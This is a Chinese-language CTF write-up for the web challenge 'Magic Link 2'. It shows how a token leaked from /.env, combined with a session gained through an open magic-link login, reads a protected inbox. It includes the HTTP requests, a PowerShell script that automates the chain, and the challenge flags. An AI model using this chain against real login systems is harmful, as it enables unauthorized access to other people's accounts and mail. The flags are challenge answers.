# Magic Link 2

## 题目信息

- 类型：Web
- 题目状态：已解出
- 目标：https://bluehens-magic-link.chals.io/
- 核心漏洞：`/.env` 泄露的 Teddy token 可以配合任意已登录 session 访问 `/inbox`，从而读到 Teddy 收件箱里的第二层 flag

## 入口与现象

第一层已经能从 `/.env` 读到：

```text
TEDDYS_EMAIL=teddy@udctf.com
TEDDYS_TOKEN=udctf{d0n7_h057_y0ur_3nv_f113}
ADMIN_EMAIL=admin@udctf.com
INBOX_URL=http://localhost:5050/inbox?token=${TEDDYS_TOKEN}
```

这里最关键的不是第一层 flag 本身，而是后两项信息：

- Teddy 的 inbox 需要一个 `token`
- 管理员邮箱和 Teddy 的内部收件箱是题目后续流程的一部分

再看 `robots.txt`：

```text
User-agent: *
Disallow: /inbox
Disallow: /dashboard
Disallow: /.env
```

`/inbox` 明确被藏起来了，说明它就是下一层重点。

## 分析过程

### 1. `token` 单独访问 `/inbox` 不够

直接访问：

```http
GET /inbox?token=udctf{d0n7_h057_y0ur_3nv_f113} HTTP/1.1
Host: bluehens-magic-link.chals.io
```

返回：

```http
HTTP/1.1 403 FORBIDDEN
```

说明 `/inbox` 不是单纯拿 token 就能看，还额外要求调用者处于某种已认证状态。

### 2. 先拿一个普通登录态

继续测试发现，`/login` 不只会给管理员或 Teddy 生成 magic link，任意邮箱都能收到返回的 `uuid`。随后访问 `/login/<uuid>` 就能得到一个已登录 session。

这意味着第二层并不要求先拿管理员权限，只要先换到任意登录态，再带着第一层泄露的 token 去打 `/inbox` 即可。

### 3. 带 session 和 Teddy token 打开收件箱

我在 2026-04-18 的实测中，用一个随机邮箱换到 session 后，再访问：

```http
GET /inbox?token=udctf{d0n7_h057_y0ur_3nv_f113} HTTP/1.1
Host: bluehens-magic-link.chals.io
Cookie: session=...
```

服务端会返回 Teddy 的 inbox 页面：

```html
<h2>Teddy's Inbox (Refreshes every 5s)</h2>
```

这个页面非常长，夹杂大量空白节点，直接肉眼看很不方便。把返回内容保存下来再搜 `udctf{`，就能在靠后的位置找到第二层 flag：

```html
<li><a href="/login/m8hxfWL6vuzPl3fOm-Ywjw">Click here to login</a></li>
<p>udctf{m4g1c_l1nks_4r3_w31rd}</p>
```

到这里第二层 flag 就出来了。

## 利用过程

1. 通过 `/.env` 拿到 Teddy 的 token，也就是 `udctf{d0n7_h057_y0ur_3nv_f113}`。
2. 向 `/login` 提交任意邮箱，读取响应中的 `uuid`。
3. 访问 `/login/<uuid>`，换到一个已登录 session。
4. 带着这个 session 访问 `/inbox?token=TEDDYS_TOKEN`。
5. 保存 inbox HTML 并搜索 `udctf{`，读出第二层 flag。

## 关键 payload / 命令

```powershell
$mail = 'foo@example.com'
$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$login = Invoke-RestMethod -Method Post -Uri 'https://bluehens-magic-link.chals.io/login' -Form @{ email = $mail }
$uuid = $login.uuid
try {
    Invoke-WebRequest -Uri ("https://bluehens-magic-link.chals.io/login/" + $uuid) -WebSession $s -MaximumRedirection 0 -ErrorAction Stop | Out-Null
} catch {
    if ($_.Exception.Response.StatusCode.value__ -notin 301,302,303,307,308) { throw }
}
$inbox = Invoke-WebRequest -Uri 'https://bluehens-magic-link.chals.io/inbox?token=udctf{d0n7_h057_y0ur_3nv_f113}' -WebSession $s
$inbox.Content | Set-Content .\inbox.html
```

然后本地搜索：

```bash
rg -n "udctf\\{|/login/" inbox.html
```

关键命中：

```html
<li><a href="/login/m8hxfWL6vuzPl3fOm-Ywjw">Click here to login</a></li>
<p>udctf{m4g1c_l1nks_4r3_w31rd}</p>
```

## Flag

```text
udctf{m4g1c_l1nks_4r3_w31rd}
```

## 总结

第二层的核心问题是鉴权拼接错了。开发者本来想用 Teddy 的 token 保护内部 inbox，但实际检查变成了“泄露的 token + 任意已登录 session”就能通过。结果是攻击者只要先拿第一层的 `.env` 泄露，再随便给自己换一个 magic link 登录态，就能读到 Teddy 收件箱里的第二层 flag。
